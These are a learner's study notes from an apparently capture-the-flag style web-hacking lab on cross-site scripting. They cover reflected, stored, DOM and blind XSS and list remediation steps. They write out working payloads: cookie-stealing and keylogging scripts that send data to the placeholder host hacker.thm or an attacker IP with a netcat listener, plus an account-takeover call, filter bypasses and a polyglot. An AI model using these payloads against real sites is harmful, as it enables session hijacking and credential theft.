# XSS - Intro to Cross-site Scripting
**Path:** Jr Penetration Tester - Introduction to Web Hacking
**Date:** 2026-03-26
**Difficulty:** Easy

---

## What is XSS

App reflects or stores user input without sanitization,
allowing JavaScript to execute in the victim's browser.
Two parts to every payload:
```
Intention    → what you want the JS to do
Modification → changes needed to execute in that context
```

---

## Types of XSS
```
Reflected XSS  → input reflected in response, not stored, victim clicks crafted link
Stored XSS     → payload saved in DB, fires for every user who visits
DOM Based XSS  → happens client-side in JS, never hits the server
Blind XSS      → payload fires somewhere you cant see (admin panel)
```

---

## XSS Payloads

**Proof of Concept**
Just proves XSS is possible:
```
<script>alert('XSS');</script>
```

**Session Stealing**
Grabs cookie, base64 encodes it, sends to attacker:
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Key Logger**
Logs every keypress and sends to attacker:
```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
Dangerous if installed on login or payment pages.

**Business Logic**
Calls existing JS functions on the page:
```
<script>user.changeEmail('attacker@hacker.thm');</script>
```
After email change → attacker does password reset → account takeover.

---

## Reflected XSS

Input from URL is reflected back on the page without sanitization.
```
# Basic test — check if input appears on page
http://target.com/search?q=rahultest123

# If reflected → inject payload
http://target.com/search?q=<script>alert(1)</script>
```

**Where to test in a URL:**
```
?q=          → search fields
?id=         → item/user identifiers
?error=      → error messages
?redirect=   → redirect/return URL params
/user/<xss>  → path parameters
```

---

## Stored XSS

Payload is saved in the database and fires for every visitor.
```
# Inject into any input that gets stored and displayed
Comment box  → <script>alert(1)</script>
Username     → <script>alert(1)</script>
Support ticket → <script>fetch('http://IP:PORT?c=' + btoa(document.cookie));</script>
```
More dangerous than Reflected — no crafted link needed.

---

## DOM Based XSS

Happens entirely in the browser via JavaScript.
Server never sees the payload.
```
Source → where input enters JS (location.hash, document.URL)
Sink   → where input gets executed (innerHTML, eval, document.write)
```
```
# Example sink vulnerable to DOM XSS
document.getElementById('output').innerHTML = location.hash.slice(1);

# Payload in URL
http://target.com/page#<img src=x onerror=alert(1)>
```

---

## Blind XSS

Payload fires in a place you cannot see (staff panel, logs, admin dashboard).
You need a callback to confirm execution.
```
# Step 1 — start netcat listener on AttackBox
nc -nlvp 9001

# Step 2 — inject payload with AttackBox IP
</textarea><script>fetch('http://ATTACKBOX_IP:9001?cookie=' + btoa(document.cookie));</script>

# Step 3 — wait for admin to trigger it
# Step 4 — cookie arrives in nc listener as base64
# Step 5 — decode at base64decode.org
```

**Important:**
Use AttackBox IP — your VPN IP cannot be reached by the target server.

---

## Filter Bypasses
```
<img src=x onerror=alert(1)>     → when script tag is blocked
"><script>alert(1)</script>      → break out of attribute
';alert(1)//                     → break out of JS string
" onmouseover="alert(1)          → inject into attribute
</textarea><script>alert(1)</script> → close textarea first
%253cscript%253e                 → double URL encode
```

---

## Remediation
```
- Encode all user output (HTML entity encoding)
- Validate and sanitize all user input
- Use Content Security Policy (CSP) headers
- Never insert user input directly into innerHTML or eval
- Use HTTPOnly flag on cookies to block JS access
```

---

## Gotchas / Surprises

- AttackBox IP must be used for blind XSS callbacks not VPN IP
- Stored XSS is more dangerous — no user interaction needed beyond visiting
- DOM XSS never reaches the server so server-side filters wont catch it
- btoa() encodes to base64, atob() decodes
- HTTPOnly cookies cannot be stolen via document.cookie
- Blind XSS can take time to fire — admin has to visit the page
- **Polyglots:**
    - An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.  
    - ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``


---

## My Understanding in Plain English

XSS tricks the browser into running your JavaScript on
someone elses session. Reflected fires once via a URL.
Stored fires for every visitor. DOM happens in the browser
itself. Blind fires somewhere hidden like an admin panel.
The cookie stealer payload fetches the victims cookie and
sends it to your listener so you can hijack their session.

---

## Related Notes

- [[Web Application Basics]]
- [[Burp Suite Basics]]
- [[Walking An Application]]
- [[OWASP Top 10 Application Defence]]
